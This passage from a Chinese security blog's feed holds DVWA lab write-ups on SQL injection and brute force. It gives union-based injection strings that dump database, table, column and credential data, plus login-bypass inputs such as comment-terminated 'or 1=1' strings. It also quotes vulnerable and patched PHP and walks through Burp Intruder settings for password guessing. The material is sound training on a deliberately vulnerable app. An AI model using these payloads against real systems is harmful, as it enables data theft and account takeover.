class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Was a number entered?</span><br><span class="line">if(is_numeric( $id )) &#123;</span><br><span class="line">// Check the database</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// User wasn&apos;t found, so the page wasn&apos;t!</span><br><span class="line">header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>加入token机制防止CSRF，仍然使用PDO预处理语句划清了数据与代码的界限，杜绝了SQL注入。</p><p>参考文献:<br><a href="https://www.freebuf.com/articles/web/120985.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)</a></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（三）SQL Injection</title>
      <link href="/2018/05/12/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89SQL-Injection/"/>
      <url>/2018/05/12/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89SQL-Injection/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（三）SQL Injection<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入1</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074136032.png" alt></p><p>输入1’报错，可以知道这里的ID是单引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>输入1’ or 1=’1显示了所有姓名和ID，可以知道是用了while循环显示</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074205885.png" alt></p><p>输入<code>id=1&#39; union select 1-- k&amp;Submit=Submit</code>报错<code>The used SELECT statements have a different number of columns</code><br>输入<code>id=1&#39; union select 1,2-- k&amp;Submit=Submit</code>正常显示,1,2号位也正常显示出来</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074237759.png" alt></p><p><strong>爆数据库</strong></p><p><code>id=1&#39; union select 1,database()-- k&amp;Submit=Submit 2</code>号位显示数据库名为<code>dvwa</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074306143.png" alt></p><p><strong>爆表</strong></p><p><code>id=1&#39; union select 1,group_concat(0x3e,table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; -- k&amp;Submit=Submit</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074326343.png" alt></p><p><strong>爆列</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,group_concat(0x3e,column_name) from information_schema.columns where table_schema=&apos;dvwa&apos; -- k&amp;Submit=Submit</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074528570.png" alt></p><p><strong>爆出所有用户名和密码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074544735.png" alt></p><p><strong>源码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_REQUEST[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[&quot;first_name&quot;];</span><br><span class="line">$last = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>没有任何过滤，最基本的SQL注入</p><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>变成了下拉框</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074705950.png" alt></p><p>可以查看元素知道<code>name=id，post</code>表单，可以用burp抓包改id或者用<code>hackbar</code>。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074726997.png" alt></p><p><code>id=1&#39;</code>发现单引号被转义了</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074740092.png" alt></p><p><code>id=1 or 1=1&amp;Submit=Submit</code>显示所有ID和姓名，可以判断是数字型。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074820589.png" alt></p><p>其余方法和LOW难度一样</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074754426.png" alt></p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_POST[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">// Display values</span><br><span class="line">$first = $row[&quot;first_name&quot;];</span><br><span class="line">$last = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>与LOW相比仅仅加了一个<code>mysqli_real_escape_string</code>函数转义<code>\x00，\n，\r，\，&#39;，&quot;，\x1a</code>。单引号闭合变成了数字型。</p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p>变成了在另外一个窗口提交ID到该页面</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074936478.png" alt></p><p>其余步骤和上面差不多</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074945284.png" alt></p><p>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p><p><strong>源码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_SESSION [ &apos;id&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_SESSION[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[&quot;first_name&quot;];</span><br><span class="line">$last = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>与Medium难度相比High难度没有转义函数，在SQL语句后面添加了一个limit，限制输出结果为1条。虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。安全代码 Impossible难度</p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Was a number entered?</span><br><span class="line">if(is_numeric( $id )) &#123;</span><br><span class="line">// Check the database</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// Make sure only 1 result is returned</span><br><span class="line">if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[ &apos;first_name&apos; ];</span><br><span class="line">$last = $row[ &apos;last_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>添加了token机制，防止CSRF攻击。<br>SQL语句使用<br><a href="https://link.jianshu.com/?t=http://www.runoob.com/php/php-pdo.html" target="_blank" rel="noopener">PDO机制预处理语句</a><br><a href="https://link.jianshu.com/?t=http://192.168.86.128/DVWA-master/vulnerabilities/sqli/" target="_blank" rel="noopener">PHP PDO 预处理语句与存储过程</a></p><p>原理：两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。<br>划清了代码与数据的界限，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（二）Brute Force</title>
      <link href="/2018/05/06/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Brute-Force/"/>
      <url>/2018/05/06/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Brute-Force/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（二）Brute Force（暴力破解模块）<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称为枚举法。</p><h1 id="Burp-Intruder模块"><a href="#Burp-Intruder模块" class="headerlink" title="Burp Intruder模块"></a>Burp Intruder模块</h1><p>1.Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。</p><p>原理：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p><p>●标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。<br>●提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。<br>●模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p><p>2.Burp Intruder主要有四个模块组成:</p><p>●：Target 用于配置目标服务器进行攻击的详细信息。<br>●：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。<br>●：Payloads 设置payload，配置字典<br>●：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><p><strong>Target 目标选项(Target tab)</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326071837707.png" alt></p><p><strong>Positions 位置选项(Positions tab)</strong></p><p>这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072033918.png" alt></p><p><a href="https://blog.csdn.net/huilan_same/article/details/64440284" target="_blank" rel="noopener">Burp Suite Intruder的4种攻击类型</a></p><p><strong>Payloads 有效负荷选项(Payloads tab)</strong></p><p>选项1：Payload Sets Payload数量类型设置</p><p>选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072404904.png" alt></p><p>选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072436744.png" alt></p><p>选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072501647.png" alt></p><p><strong>Opetions 选项卡(Options tab)</strong></p><p>选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072532239.png" alt></p><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。</p><p>选项2：Request Engine 设置发送请求的线程、超时重试等。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072629561.png" alt></p><p>选项3：Attack Results 设置攻击结果的显示。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072640144.png" alt></p><p>选项4：Grep - Match Grep Match——这个设置主要用来从响应消息中提取结果项，如果匹配，则在攻击结果中添加的新列中标明，便于排序和数据提取。比如说，在密码猜测攻击，扫描诸如“密码不正确”或“登录成功”，可以找到成功的登录;在测试SQL注入漏洞，扫描包含“ODBC”，“错误”等消息可以识别脆弱的参数</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072820654.png" alt></p><p>选项5：Grep Extract——这些设置可用于提取响应消息中的有用信息。对于列表中配置的每个项目，Burp会增加包含提取该项目的文本的新结果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。此选项是从应用数据挖掘有用的，能够支持广泛的攻击。例如，如果你是通过一系列文档ID的循环，可以提取每个文档寻找有趣的项目的页面标题。如果您发现返回的其他应用程序用户详细信息的功能，可以通过用户ID重复和检索有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，并返回一个用户配置的密码提示，您可以通过共同的用户名列表运行和收获的所有相关密码的提示，然后直观地浏览列表寻找容易被猜到密码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072842898.png" alt></p><p>选项6：Grep Payloads——这些设置可用于提取响应消息中是否包含Payload的值，比如说，你想验证反射性的XSS脚本是否成功，可以通过此设置此项。当此项设置后，会在响应的结果列表中，根据Payload组的数目，添加新的列，显示匹配的结果，你可以通过点击列标题对结果集进行排序和查找。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072928707.png" alt></p><p>选项7：Redirections 重定向响应，重定向（Redirections）——这些设置主要是用来控制执行攻击时Burp如何处理重定向，在实际使用中往往是必须遵循重定向，才能实现你的攻击目的。例如，在密码猜测攻击，每次尝试的结果可能是密码错误会重定向响应到一个错误消息提示页面，如果密码正确会重定向到用户中心的首页。 但设置了重定向也可能会遇到其他的问题，比如说，在某些情况下，应用程序存储您的会话中初始请求的结果，并提供重定向响应时检索此值，这时可能有必要在重定向时只使用一个单线程攻击。也可能会遇到，当你设置重定向，应用程序响应会重定向到注销页面，这时候，按照重定向可能会导致您的会话被终止时.</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072938164.png" alt></p><p>参考：<a href="https://link.jianshu.com/?t=https://blog.csdn.net/u011781521/article/details/54772795" target="_blank" rel="noopener">BurpSuite系列(五)—-Intruder模块(暴力破解)</a></p><h1 id="Brute-Force（暴力破解）"><a href="#Brute-Force（暴力破解）" class="headerlink" title="Brute Force（暴力破解）"></a>Brute Force（暴力破解）</h1><h2 id="LOW等级"><a href="#LOW等级" class="headerlink" title="LOW等级"></a>LOW等级</h2><p>查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Login&apos; ] ) ) &#123;</span><br><span class="line">// Get username</span><br><span class="line">$user = $_GET[ &apos;username&apos; ];</span><br><span class="line"></span><br><span class="line">// Get password</span><br><span class="line">$pass = $_GET[ &apos;password&apos; ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">// Check the database</span><br><span class="line">$query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>很明显没有任何过滤，存在SQL注入，因为mysqli_num_rows( $result ) == 1，所以产生的结果数必须为1条,而且密码经过了md5加密，是不可控的，所以只能在username上构造语句:<br>SELECT * FROM ‘users’ WHERE user = ‘1’ or 1=1 limit 0,1#’ AND password = ‘随意填’;</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073409973.png" alt></p><p>当然如果你知道一个用户名为admin的话，也可以构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &apos;users&apos; WHERE user = &apos;admin&apos;#&apos; AND password = &apos;$pass&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073433422.png" 